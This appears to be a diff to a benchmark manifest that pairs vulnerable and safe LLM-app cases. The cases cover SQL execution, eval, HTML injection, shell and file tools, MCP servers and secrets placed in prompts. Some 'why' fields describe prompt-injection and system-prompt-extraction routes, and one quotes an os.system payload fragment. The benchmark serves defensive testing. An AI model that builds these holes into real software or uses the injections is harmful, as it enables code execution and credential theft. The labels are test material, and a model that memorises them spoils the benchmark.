+      "language": "python",
+      "summary": "CLI sales report tool that turns a question into SQL with OpenAI.",
+      "cases": [
+        {
+          "path": "out-text-to-sql-execute/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-89"
+          ],
+          "source": "SQL text written by the model",
+          "sink": "sqlite3 conn.execute on a writable connection, followed by commit",
+          "why": "Whatever the model writes runs with full privileges, so a request or injected instruction can produce UPDATE, DELETE or DROP statements."
+        },
+        {
+          "path": "out-text-to-sql-execute/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-89"
+          ],
+          "source": "Structured output limited to a Literal report name and a bounded integer",
+          "sink": "Fixed parameterized queries selected by report name",
+          "why": "The model never writes SQL; it only picks one of two fixed queries and a bound day count."
+        }
+      ]
+    },
+    {
+      "id": "out-eval-word-problem-calculator",
+      "category": "output-handling",
+      "language": "python",
+      "summary": "Flask tutoring endpoint that converts a word problem into an arithmetic expression with Claude.",
+      "cases": [
+        {
+          "path": "out-eval-word-problem-calculator/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-95"
+          ],
+          "source": "Model reply text",
+          "sink": "eval()",
+          "why": "A user can get the model to return Python such as __import__('os').system(...), which eval runs on the server."
+        },
+        {
+          "path": "out-eval-word-problem-calculator/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-95"
+          ],
+          "source": "Model reply text",
+          "sink": "AST walker that allows only numeric constants, + - * / and unary minus",
+          "why": "Anything other than plain arithmetic is rejected before evaluation; no code is executed."
+        }
+      ]
+    },
+    {
+      "id": "out-chat-markdown-html-fragment",
+      "category": "output-handling",
+      "language": "javascript",
+      "summary": "Express htmx endpoint that renders the assistant's Markdown answer as an HTML fragment.",
+      "cases": [
+        {
+          "path": "out-chat-markdown-html-fragment/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM05",
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-79",
+            "CWE-1427"
+          ],
+          "source": "Model answer built from help-center search results that include customer-posted community answers",
+          "sink": "marked.parse output sent as HTML with res.send",
+          "why": "marked passes raw HTML through, so an answer that contains script or event-handler markup, for example one planted by a community post, runs in the page."
+        },
+        {
+          "path": "out-chat-markdown-html-fragment/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM05",
+            "LLM01"
+          ],
+          "cwe": [
+            "CWE-79",
+            "CWE-1427"
+          ],
+          "source": "Model answer built from help-center search results that include customer-posted community answers",
+          "sink": "DOMPurify.sanitize(marked.parse(answer)) sent as HTML",
+          "why": "The rendered Markdown is sanitized before it is sent, removing scripts and event handlers."
+        }
+      ]
+    },
+    {
+      "id": "agency-shell-tool-ops-cli",
+      "category": "excessive-agency",
+      "language": "python",
+      "summary": "Interactive ops assistant on a production database host built with LangChain AgentExecutor.",
+      "cases": [
+        {
+          "path": "agency-shell-tool-ops-cli/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-78",
+            "CWE-250"
+          ],
+          "source": "Operator request and model-generated commands",
+          "sink": "ShellTool with no confirmation step",
+          "why": "The model runs any shell command it decides on, on a production host, so a misread request or a hallucinated cleanup can destroy data."
+        },
+        {
+          "path": "agency-shell-tool-ops-cli/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-78",
+            "CWE-250"
+          ],
+          "source": "Operator request and model-generated commands",
+          "sink": "ShellTool with HumanApprovalCallbackHandler",
+          "why": "Every command is printed and runs only after the operator explicitly approves it."
+        }
+      ]
+    },
+    {
+      "id": "agency-python-exec-analytics-tool",
+      "category": "excessive-agency",
+      "language": "python",
+      "summary": "FastAPI data-analysis endpoint where a LlamaIndex agent writes Python over an uploaded CSV.",
+      "cases": [
+        {
+          "path": "agency-python-exec-analytics-tool/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-94"
+          ],
+          "source": "Model-written code, driven by the request's question and CSV contents",
+          "sink": "exec() inside the API process",
+          "why": "Any caller can get arbitrary code run in the server process with its credentials, filesystem and network access."
+        },
+        {
+          "path": "agency-python-exec-analytics-tool/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-94"
+          ],
+          "source": "Model-written code, driven by the request's question and CSV contents",
+          "sink": "python -c inside a docker container with no network, read-only root, resource limits and an unprivileged user",
+          "why": "The code runs in an isolated sandbox that can only read the uploaded CSV."
+        }
+      ]
+    },
+    {
+      "id": "agency-file-toolkit-unrooted",
+      "category": "excessive-agency",
+      "language": "python",
+      "summary": "Documentation maintenance agent built on LangChain FileManagementToolkit.",
+      "cases": [
+        {
+          "path": "agency-file-toolkit-unrooted/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-22",
+            "CWE-73"
+          ],
+          "source": "Model-chosen file paths",
+          "sink": "FileManagementToolkit with no root_dir and every tool, including delete and move",
+          "why": "Without root_dir the tools accept any path, so the agent can read secrets and overwrite or delete any file the process can reach."
+        },
+        {
+          "path": "agency-file-toolkit-unrooted/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM06"
+          ],
+          "cwe": [
+            "CWE-22",
+            "CWE-73"
+          ],
+          "source": "Model-chosen file paths",
+          "sink": "FileManagementToolkit(root_dir=DOCS_ROOT) with only read_file, write_file and list_directory",
+          "why": "root_dir confines every path to the docs folder and the destructive tools are not loaded."
+        }
+      ]
+    },
+    {
+      "id": "agency-mcp-code-search-shell",
+      "category": "excessive-agency",
+      "language": "python",
+      "summary": "FastMCP code-search server for a local monorepo.",
+      "cases": [
+        {
+          "path": "agency-mcp-code-search-shell/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-78"
+          ],
+          "source": "pattern and subdir arguments of the search_code MCP tool",
+          "sink": "subprocess.run on an f-string with shell=True",
+          "why": "A quote in pattern or a ; in subdir runs arbitrary commands on the developer's machine; the client model picks these values, possibly under injection from repository content."
+        },
+        {
+          "path": "agency-mcp-code-search-shell/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-78"
+          ],
+          "source": "pattern and subdir arguments of the search_code MCP tool",
+          "sink": "grep argv list with -e and --, cwd confined with resolve() and is_relative_to",
+          "why": "No shell is used, the pattern cannot become an option, and the search directory must be inside the repository."
+        }
+      ]
+    },
+    {
+      "id": "agency-mcp-calculator-eval",
+      "category": "excessive-agency",
+      "language": "typescript",
+      "summary": "TypeScript MCP calculator server.",
+      "cases": [
+        {
+          "path": "agency-mcp-calculator-eval/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-95"
+          ],
+          "source": "Model-chosen expression argument of the calculate MCP tool",
+          "sink": "eval(expression)",
+          "why": "The expression runs as JavaScript in the server process with Node APIs reachable, which is arbitrary code execution."
+        },
+        {
+          "path": "agency-mcp-calculator-eval/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM06",
+            "LLM05"
+          ],
+          "cwe": [
+            "CWE-95"
+          ],
+          "source": "Model-chosen expression argument of the calculate MCP tool",
+          "sink": "mathjs evaluate with a length limit",
+          "why": "mathjs parses its own expression language and does not execute JavaScript."
+        }
+      ]
+    },
+    {
+      "id": "leak-ops-console-credentials-in-system-prompt",
+      "category": "system-prompt-leakage",
+      "language": "python",
+      "summary": "Customer billing chat bot with escalation instructions in its prompt.",
+      "cases": [
+        {
+          "path": "leak-ops-console-credentials-in-system-prompt/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM07",
+            "LLM02"
+          ],
+          "cwe": [
+            "CWE-798",
+            "CWE-200"
+          ],
+          "source": "Hardcoded ops console URL, login and refund service token",
+          "sink": "System prompt sent with every customer conversation",
+          "why": "Customers can extract the system prompt with simple prompt injection, exposing the internal address, password and service token; the 'never share' line is not a control."
+        },
+        {
+          "path": "leak-ops-console-credentials-in-system-prompt/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM07",
+            "LLM02"
+          ],
+          "cwe": [
+            "CWE-798",
+            "CWE-200"
+          ],
+          "source": "Ops URL and token read from environment variables inside the escalate tool",
+          "sink": "System prompt with no credentials",
+          "why": "The credentials stay in server code; the model only supplies a case summary."
+        }
+      ]
+    },
+    {
+      "id": "disclose-stripe-key-in-prompt",
+      "category": "sensitive-disclosure",
+      "language": "javascript",
+      "summary": "Internal support tool that drafts Stripe API curl commands with OpenAI.",
+      "cases": [
+        {
+          "path": "disclose-stripe-key-in-prompt/vulnerable",
+          "vulnerable": true,
+          "expected_owasp": [
+            "LLM02"
+          ],
+          "cwe": [
+            "CWE-200"
+          ],
+          "source": "STRIPE_SECRET_KEY environment variable",
+          "sink": "User prompt sent to the OpenAI API and echoed back in the returned snippet",
+          "why": "The live secret key is sent to a third-party model provider and returned in snippets shown to support engineers, where it spreads into tickets and chat logs."
+        },
+        {
+          "path": "disclose-stripe-key-in-prompt/safe",
+          "vulnerable": false,
+          "expected_owasp": [
+            "LLM02"
+          ],
+          "cwe": [
+            "CWE-200"
+          ],
+          "source": "Literal placeholder $STRIPE_SECRET_KEY; no secret value in the prompt",
+          "sink": "User prompt sent to the OpenAI API",
+          "why": "The secret never leaves the server; the snippet references a variable the engineer's shell provides."
+        }
+      ]
+    }
+  ]
+}
